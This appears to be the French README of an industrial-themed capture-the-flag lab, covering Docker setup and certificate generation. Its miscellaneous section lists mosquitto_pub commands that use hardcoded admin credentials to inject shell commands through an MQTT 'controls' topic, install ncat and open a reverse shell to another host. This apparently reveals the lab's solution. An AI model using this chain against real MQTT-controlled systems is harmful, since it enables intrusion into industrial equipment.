# HESD04_WarGame

### Installation auto:
- Cela demande un fresh installation de l'environnement
- L'envrionnement va redémarrer automatiquement à la fin de l'installation
- L'ip d'accès sera affichée en mode console
- Le CTF sera disponible au bout de 2 minutes après l'installation

```console
user@host:~$ sudo bash install.sh
```

### Démarrer la stack (si pas d'installation auto):
```console
user@host:~$ sudo apt install docker-compose-plugin (version 2)
user@host:~$ sudo docker compose up --detach
```

### Débugger en CLI:
```console
user@host:~$ sudo docker exec -it <container> sh
```

### Générer le certificat self-signed:
Configuration du certificat dans [ctf_indus2000/proxy/cert.conf](https://github.com/SysmaxFR/ctf_indus2000/blob/main/proxy/cert.conf) \
Génération de la clé privée et du certificat dans [ctf_indus2000/proxy/cert.*](https://github.com/SysmaxFR/ctf_indus2000/tree/main/proxy)
```console
user@host:~$ openssl req -x509 -nodes -days 1825 -newkey rsa:2048 -keyout cert.key -out cert.crt -config cert.conf -extensions 'req_ext'
```

### Système:
![beer-storage-tank](README/system.jpg)
![diagram](README/diagram.jpg)


# Miscellaneous

- Changer l'icon du site ainsi que la description (/manifest.json) ?
- Accès robot.txt, manifest.json, sitemap.xml
- Laisser le Dashboard Node-Red dans le manisfest ?

```console
mosquitto_pub -h '192.168.1.2' -u 'admin' -P 'Embeddedsystems' -t  'controls' -m 'whoami'
mosquitto_pub -h '192.168.1.2' -u 'admin' -P 'Embeddedsystems' -t  'controls' -m 'cat /etc/os-release'
mosquitto_pub -h '192.168.1.2' -u 'admin' -P 'Embeddedsystems' -t  'controls' -m 'apk search ncat' --> nothing
mosquitto_pub -h '192.168.1.2' -u 'admin' -P 'Embeddedsystems' -t  'controls' -m 'apk update'
mosquitto_pub -h '192.168.1.2' -u 'admin' -P 'Embeddedsystems' -t  'controls' -m 'apk search ncat'
mosquitto_pub -h '192.168.1.2' -u 'admin' -P 'Embeddedsystems' -t  'controls' -m 'apk add nmap-ncat'
mosquitto_pub -h '192.168.1.2' -u 'admin' -P 'Embeddedsystems' -t  'controls' -m 'ncat 192.168.1.1 80 -e /bin/sh'
```

```console
user@host:~$ docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -it aquasec/trivy:latest image --severity HIGH,CRITICAL traefik
```

Authelia [Authelia](https://blog.filador.fr/gerer-les-acces-a-vos-services-avec-authelia/)

